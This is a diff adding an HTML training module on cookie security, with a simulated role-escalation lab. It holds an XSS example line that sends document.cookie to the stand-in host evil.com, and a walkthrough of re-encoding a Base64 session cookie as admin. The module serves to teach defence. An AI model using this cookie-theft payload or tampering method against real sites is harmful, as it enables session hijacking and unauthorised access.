@@ -1,0 +1,159 @@
+<section class="module-header">
+  <h1>Module 04 — Cookie Inspection &amp; Manipulation</h1>
+  <p>Understand cookie anatomy, security flags, and how attackers exploit weak session management.</p>
+</section>
+
+<section class="theory-section">
+  <h2>Cookie Anatomy</h2>
+  <p>HTTP cookies carry state between browser and server. Each cookie has these components:</p>
+
+  <div class="table-wrapper">
+    <table>
+      <thead><tr><th>Attribute</th><th>Purpose</th><th>Example</th></tr></thead>
+      <tbody>
+        <tr><td><strong>Name</strong></td><td>Identifier for the cookie</td><td><code>session_id</code></td></tr>
+        <tr><td><strong>Value</strong></td><td>The data stored</td><td><code>abc123xyz</code></td></tr>
+        <tr><td><strong>Domain</strong></td><td>Which domains receive the cookie</td><td><code>.example.com</code></td></tr>
+        <tr><td><strong>Path</strong></td><td>URL path scope</td><td><code>/app</code></td></tr>
+        <tr><td><strong>Expires/Max-Age</strong></td><td>When the cookie is deleted</td><td><code>Max-Age=3600</code></td></tr>
+        <tr><td><strong>Secure</strong></td><td>Only sent over HTTPS</td><td>Flag (boolean)</td></tr>
+        <tr><td><strong>HttpOnly</strong></td><td>Not accessible via JavaScript</td><td>Flag (boolean)</td></tr>
+        <tr><td><strong>SameSite</strong></td><td>CSRF protection</td><td><code>Strict</code>, <code>Lax</code>, <code>None</code></td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h2>Security Flags in Detail</h2>
+
+  <h3><code>Secure</code> Flag</h3>
+  <p>When set, the cookie is only transmitted over HTTPS connections. Without it, an attacker on the same network can intercept cookies via HTTP.</p>
+
+  <h3><code>HttpOnly</code> Flag</h3>
+  <p>Prevents JavaScript from accessing the cookie via <code>document.cookie</code>. This mitigates XSS-based session theft. Without it:</p>
+  <pre><code class="language-javascript">// XSS payload to steal session cookie
+new Image().src = "https://evil.com/steal?c=" + document.cookie;</code></pre>
+
+  <h3><code>SameSite</code> Attribute</h3>
+  <ul>
+    <li><strong>Strict:</strong> Cookie never sent on cross-site requests (best CSRF protection)</li>
+    <li><strong>Lax:</strong> Sent on top-level navigations (GET only) — default in modern browsers</li>
+    <li><strong>None:</strong> Always sent (requires <code>Secure</code> flag) — needed for third-party contexts</li>
+  </ul>
+
+  <h2>Base64-Encoded Cookie Values</h2>
+  <p>Many applications encode cookie values in Base64 for transport. This is <strong>encoding, not encryption</strong> — anyone can decode it:</p>
+  <pre><code class="language-javascript">// Server sets cookie:
+Set-Cookie: session=eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9
+
+// Attacker decodes:
+atob("eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9")
+// → {"user":"guest","role":"user"}
+
+// Attacker modifies and re-encodes:
+btoa('{"user":"guest","role":"admin"}')
+// → eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4ifQ==</code></pre>
+
+  <div class="callout callout-danger">
+    <strong>Never trust client-side data.</strong> Cookies can be freely modified by the user. Always validate session data server-side. Use signed/encrypted tokens (like JWTs with proper validation) instead of plain Base64.
+  </div>
+
+  <h2>Predictable Session Tokens</h2>
+  <p>Weak session tokens can be predicted or brute-forced:</p>
+  <ul>
+    <li>Sequential numbers: <code>session=1001</code>, <code>session=1002</code></li>
+    <li>Timestamp-based: <code>session=1711920000</code></li>
+    <li>Weak hashes: MD5 of username</li>
+  </ul>
+  <p>Secure tokens should be cryptographically random with at least 128 bits of entropy.</p>
+</section>
+
+<!-- ========== LABS ========== -->
+<h2>Labs</h2>
+
+<!-- Lab 1: Cookie Inspector -->
+<div class="lab-container" id="lab1">
+  <div class="lab-header">
+    <div class="lab-title"><span class="lab-num">Lab 1</span> Cookie Inspector</div>
+    <span class="lab-status" id="lab1-status"></span>
+  </div>
+
+  <div class="lab-objective">
+    <strong>Objective:</strong> A simulated login has set a session cookie. Inspect the cookie's attributes, decode the Base64 value, and identify which security flags are missing.
+  </div>
+
+  <button class="btn btn-primary mb-md" id="cookie-login-btn">Simulate Login (Set Cookie)</button>
+
+  <div id="cookie-inspector" style="display:none;">
+    <h4>Cookie Details</h4>
+    <div class="table-wrapper">
+      <table class="cookie-table">
+        <thead><tr><th>Attribute</th><th>Value</th><th>Security Assessment</th></tr></thead>
+        <tbody id="cookie-details"></tbody>
+      </table>
+    </div>
+
+    <h4 class="mt-md">Decoded Value</h4>
+    <div class="json-response" id="cookie-decoded"></div>
+
+    <div class="mt-md input-group">
+      <label>Which security flags are MISSING? (comma-separated)</label>
+      <div class="flex gap-sm">
+        <input type="text" class="input-field" id="cookie-flags-answer" placeholder="e.g., Secure, HttpOnly">
+        <button class="btn btn-primary" id="cookie-flags-submit">Check</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="banner banner-success" id="lab1-banner">
+    &#9989; Correct! You identified the missing security flags.
+  </div>
+  <div class="banner banner-error" id="lab1-error-banner">
+    &#10060; Not quite. Look at the cookie attributes and identify which security flags should be set but aren't.
+  </div>
+</div>
+
+<!-- Lab 2: Cookie Manipulation -->
+<div class="lab-container" id="lab2">
+  <div class="lab-header">
+    <div class="lab-title"><span class="lab-num">Lab 2</span> Cookie Manipulation — Role Escalation</div>
+    <span class="lab-status" id="lab2-status"></span>
+  </div>
+
+  <div class="lab-objective">
+    <strong>Objective:</strong> Your session cookie contains a Base64-encoded JSON object with your role. Decode it, change your role to <code>"admin"</code>, re-encode it, and set the modified cookie to access the admin panel.
+  </div>
+
+  <div class="panel mb-md">
+    <h4>Current Session</h4>
+    <p class="text-muted" style="font-size:0.85rem;">Cookie name: <code>session</code></p>
+    <p class="text-muted" style="font-size:0.85rem;">Current value: <code id="current-cookie-value"></code></p>
+  </div>
+
+  <div class="encoder-grid">
+    <div>
+      <div class="input-group">
+        <label>Step 1: Decoded JSON (modify this):</label>
+        <textarea class="input-field" id="cookie-edit-json" rows="3" style="font-family:var(--font-mono);"></textarea>
+      </div>
+      <div class="input-group">
+        <label>Step 2: Re-encoded Base64:</label>
+        <input type="text" class="input-field" id="cookie-edit-b64" readonly>
+      </div>
+      <div class="flex gap-sm">
+        <button class="btn btn-secondary" id="cookie-encode-btn">Encode to Base64</button>
+        <button class="btn btn-primary" id="cookie-set-btn">Set Cookie &amp; Access Admin Panel</button>
+      </div>
+    </div>
+    <div>
+      <label style="font-size:0.8rem;color:var(--text-secondary);font-weight:600;">Admin Panel:</label>
+      <div class="terminal-output" id="admin-panel" style="min-height:120px;">
+        <span style="color:var(--accent-red);">Access Denied</span>
+        <br>You must be an admin to view this panel.
+      </div>
+    </div>
+  </div>
+
+  <div class="banner banner-success" id="lab2-banner">
+    &#9989; Access granted! You escalated your role by manipulating the session cookie.
+  </div>
+</div>
